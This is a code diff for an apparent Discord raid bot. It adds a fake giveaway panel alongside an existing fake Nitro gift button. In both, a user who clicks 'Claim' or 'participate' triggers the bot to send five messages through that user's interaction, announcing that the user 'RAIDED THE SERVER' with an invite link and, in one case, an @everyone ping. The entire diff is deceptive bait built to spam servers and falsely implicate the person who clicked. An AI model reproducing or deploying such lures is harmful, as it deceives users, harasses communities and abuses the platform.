@@ -1,11 +1,14 @@
 import asyncio
+import time
+import random
 import aiohttp
 import discord
 from core.utils.helpers import send_message_http, ZNE_INVITE
 
+
 class FakeNitroView(discord.ui.LayoutView):
-    text_display1 = discord.ui.TextDisplay(content="You’re awesome, just like this gift. Enjoy!")
-    
+    text_display1 = discord.ui.TextDisplay(content="You're awesome, just like this gift. Enjoy!")
+
     claim_button = discord.ui.Button(
         label="Claim",
         style=discord.ButtonStyle.success,
@@ -28,19 +31,58 @@ class FakeNitroView(discord.ui.LayoutView):
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
         if interaction.data.get("custom_id") == "fake_nitro_claim":
             await interaction.response.defer()
-            
+
             user_mention = interaction.user.mention
-            
+
             app_id = interaction.client.application_id
             token = interaction.token
             content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE} @everyone"
-            
+
             async with aiohttp.ClientSession() as session:
                 tasks = [
                     send_message_http(session, app_id, token, content)
                     for _ in range(5)
                 ]
                 await asyncio.gather(*tasks)
-            
+
             return False
         return True
+
+
+def fake_giveaway(prize: str):
+    future_ts = int(time.time()) + random.randint(3600, 86400)
+    winners_count = random.randint(1, 4)
+
+    class FakeGiveawayView(discord.ui.LayoutView):
+        container1 = discord.ui.Container(
+            discord.ui.TextDisplay(content=f"## {prize}\n**duration**: <t:{future_ts}:R>\n**winners**: `{winners_count}`"),
+            discord.ui.ActionRow(
+                discord.ui.Button(
+                    style=discord.ButtonStyle.success,
+                    label="participate",
+                    custom_id="enter_giveaway_button",
+                ),
+            ),
+            accent_colour=discord.Colour(16777215),
+        )
+
+        async def interaction_check(self, interaction: discord.Interaction) -> bool:
+            if interaction.data.get("custom_id") == "enter_giveaway_button":
+                await interaction.response.defer()
+
+                user_mention = interaction.user.mention
+                app_id = interaction.client.application_id
+                token = interaction.token
+                content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE}"
+
+                async with aiohttp.ClientSession() as session:
+                    tasks = [
+                        send_message_http(session, app_id, token, content)
+                        for _ in range(5)
+                    ]
+                    await asyncio.gather(*tasks)
+
+                return False
+            return True
+
+    return FakeGiveawayView()
